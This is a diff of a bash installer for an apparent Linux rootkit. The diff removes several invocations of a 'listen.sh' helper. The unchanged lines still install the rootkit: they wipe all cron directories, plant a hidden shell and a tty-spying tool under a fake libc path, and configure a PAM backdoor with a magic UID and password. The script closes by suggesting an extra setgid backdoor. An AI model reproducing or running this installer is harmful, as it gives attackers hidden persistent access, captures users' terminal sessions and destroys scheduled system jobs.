@@ -1,5 +1,4 @@
 #!/bin/bash
-sh utils/ex/listen.sh
 if [ -f /usr/bin/yum ]; then
   yes|yum install make gcc pam-devel openssl-devel libpcap libpcap-devel newt libgcc.i686 glibc-devel.i686 glibc-devel openssl-devel.i686 wget curl unzip zip strace
 elif [ -f /usr/bin/apt-get ] ; then
@@ -68,7 +67,6 @@ rm -rf /etc/cron.hourly/*
 rm -rf /etc/cron.daily/*
 rm -rf /etc/cron.weekly/*
 rm -rf /etc/cron.monthly/*
-sh utils/ex/listen.sh
 cat .bashrc > /usr/lib/libc.so.${MAGICNUM3}/.bashrc
 sed -i "s/MAGIC_ENV/$ENV/" /usr/lib/libc.so.${MAGICNUM3}/.bashrc
 mkdir /usr/lib/libc.so.${MAGICNUM3}/bin
@@ -77,10 +75,7 @@ chmod +x /usr/lib/libc.so.${MAGICNUM3}/bin/espeon-shell
 cp utils/ttyspy.sh /usr/lib/libc.so.${MAGICNUM3}/bin/ttyspy
 mkdir /usr/lib/libc.so.${MAGICNUM3}/utils
 mkdir /usr/lib/libc.so.${MAGICNUM3}/utils/ex
-cp utils/ex/listen.sh /usr/lib/libc.so.${MAGICNUM3}/utils/ex/listen.sh
-chmod +x /usr/lib/libc.so.${MAGICNUM3}/utils/ex/listen.sh
 chmod +x /usr/lib/libc.so.${MAGICNUM3}/bin/ttyspy
-sh /usr/lib/libc.so.${MAGICNUM3}/utils/ex/listen.sh
 rm -rf /usr/lib/libc.so.${MAGICNUM3}/utils
 echo -e "cryptpass='${PWC}'\nhome='/usr/lib/libc.so.${MAGICNUM3}'\nmagic_uid=$MAGICNUM\n" >> /usr/lib/libc.so.${MAGICNUM3}/bin/umbreon.py
 cp utils/unhide-self.py /usr/lib/libc.so.${MAGICNUM3}/bin/.x
@@ -106,7 +101,6 @@ rm -rf /etc/cron.hourly/*
 rm -rf /etc/cron.daily/*
 rm -rf /etc/cron.weekly/*
 rm -rf /etc/cron.monthly/*
-sh utils/ex/listen.sh
 echo "Installed successfully."
 echo "If you need a backdoor other than the PAM one, consider adding a setgid($MAGICNUM) into it."
 echo "If shit is broken, run ./unfuck"
